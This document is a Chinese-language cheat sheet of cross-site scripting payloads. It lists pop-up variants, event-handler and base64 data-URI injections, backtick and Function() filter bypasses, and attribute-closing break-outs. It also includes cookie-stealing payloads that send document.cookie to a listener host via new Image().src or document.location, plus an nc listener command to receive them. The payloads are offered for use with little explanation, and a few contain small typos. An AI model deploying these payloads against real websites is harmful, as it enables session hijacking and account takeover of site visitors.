```
xss三种弹窗方式
alert('xss') // 直接执行
confirm('xss') // 需要点击
prompt('xss') // 需要输入

xss几种执行
<script>+弹窗方式</script>
document.write('console.log(alert("xss"))')
document.write('<script>alert(1)</\script>')
console.log(alert('xss'))
console.error(1)

<script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script>

<img src=1 onerror='prompt(document.cookie)'>;

http://<img src=1 onerror="a='al',b='ert',c='(/xss/)'" />

<svg onload=confirm(1)>

<iframe src/="data:text/html;base64,PHNjcmlwdD5kb2N1bWVudC53cml0ZSgnPHNjcmlwdD5jb25mcmltKDEpPC9cc2NyaXB0PicpPFwvc2NyaXB0Pg=="></iframe>

<a href="data:text/plain;base64,PHNjcmlwdD5kb2N1bWVudC53cml0ZSgnPHNjcmlwdD5jb25mcmltKDEpPC9cc2NyaXB0PicpPFwvc2NyaXB0Pg==">111

经典
Function和function不一样  他执行括号里面第一个内容.
Function(alert('1'))()
'Function(alert('1'))()
<button onclick=alert(1)>11

<value>121</value>  <--`<img/src=` onerror=alert`1` --!>


``反引号可以代表括号使用.
';Function(alert`1`)();

<object data="data:text/plain;base64,PHNjcmlwdD5kb2N1bWVudC53cml0ZSgnPHNjcmlwdD5jb25mcmltKDEpPC9cc2NyaXB0PicpPFwvc2NyaXB0Pg=="></object>

直接绕xss  <img src='http://127.0.0.1/1.js' />
渗透机使用nc -lnvp 4444 即可绕过 
var img=new image();
img.src="http://127.0.0.1:4444/a.php?cookie="+document.cookie;

<script>document.location="http://127.0.0.1/a.php?cookie="+document.cookie+""</script> xss万能用户

 <a href="javascript:alert('hello')" >
 <iframe src="javascript:alert('hello')" />
 <img src='x' onerror="alert('hello')" />
 <video src='x' onerror="alert('hello')" ></video>
 <div onclick="alert('hello')" onmouseover="alert('hello2')" ><div>

 闭合掉
 1' onclick="alert('xss')">
 '><img src=1 onerror="alert('xss')">


<script>new Image().src="http://192.168.52.206/?co="+document.cookie;</script>
```